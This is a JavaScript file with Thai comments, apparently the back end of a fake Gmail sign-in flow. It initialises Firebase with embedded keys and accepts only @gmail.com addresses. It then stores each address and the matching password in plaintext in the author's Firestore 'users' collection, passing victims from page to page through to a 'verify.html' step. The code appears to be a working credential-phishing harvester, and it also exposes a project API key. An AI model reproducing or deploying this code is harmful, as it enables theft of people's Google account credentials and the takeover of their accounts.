// ✅ Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyCTgAP4Tvlri2-seayJIrC9dpwTA-avZA0",
    authDomain: "loginsystem-7f056.firebaseapp.com",
    projectId: "loginsystem-7f056",
    storageBucket: "loginsystem-7f056.appspot.com",
    messagingSenderId: "1094872135642",
    appId: "1:1094872135642:web:72419f77faf8537c36b2e3",
    measurementId: "G-NT11WXB1W3"
};

// ✅ ตรวจสอบว่า Firebase ถูกโหลดก่อนใช้งาน
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}

const db = firebase.firestore();  // Firestore Database

console.log("🔥 Firebase โหลดสำเร็จ:", firebase);
console.log("📂 Firestore Instance:", db);

// 📌 ฟังก์ชันบันทึกอีเมลลง Firestore
function saveEmail() {
    let email = document.getElementById("email").value.trim();
    console.log("📩 อีเมลที่กรอก:", email);

    // 🔍 ตรวจสอบว่าอีเมลลงท้ายด้วย @gmail.com หรือไม่
    if (!email.endsWith("@gmail.com")) {
        alert("กรุณาใช้ที่อยู่อีเมลที่ลงท้ายด้วย @gmail.com");
        return; // ❌ หยุดทำงาน ไม่ให้ไปต่อ
    }

    if (!email) {
        return; // ❌ ไม่แจ้งเตือน แค่ไม่ให้ทำงานต่อ
    }

    // 🔥 บันทึกอีเมลลง Firestore
    db.collection("users").doc(email).set({
        email: email,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
    }, { merge: true })
    .then(() => {
        console.log("✅ อีเมลถูกบันทึกลง Firebase:", email);
        localStorage.setItem("userEmail", email);
        window.location.href = "password.html"; // 🔄 เปลี่ยนหน้าไปใส่รหัสผ่าน
    })
    .catch(error => {
        console.error("❌ เกิดข้อผิดพลาด:", error);
    });
}

// 📌 ฟังก์ชันบันทึกรหัสผ่านลง Firestore
function savePassword() {
    let password = document.getElementById("password").value.trim();
    let email = localStorage.getItem("userEmail");

    console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);

    if (!email) {
        window.location.href = "index.html"; // 🔄 เปลี่ยนหน้าโดยไม่มี `alert`
        return;
    }

    if (!password) {
        alert("กรุณาป้อนรหัสผ่าน"); // แจ้งเตือนถ้ายังไม่ใส่รหัส
        return; 
    }

    // 🔥 บันทึกรหัสผ่านลง Firestore
    db.collection("users").doc(email).update({
        password: password
    })
    .then(() => {
        console.log("✅ รหัสผ่านถูกบันทึกใน Firebase!");
        window.location.href = "verify.html"; // 🔄 เปลี่ยนหน้าไปยืนยันตัวตน
    })
    .catch(error => {
        console.error("❌ เกิดข้อผิดพลาด:", error);
    });
}
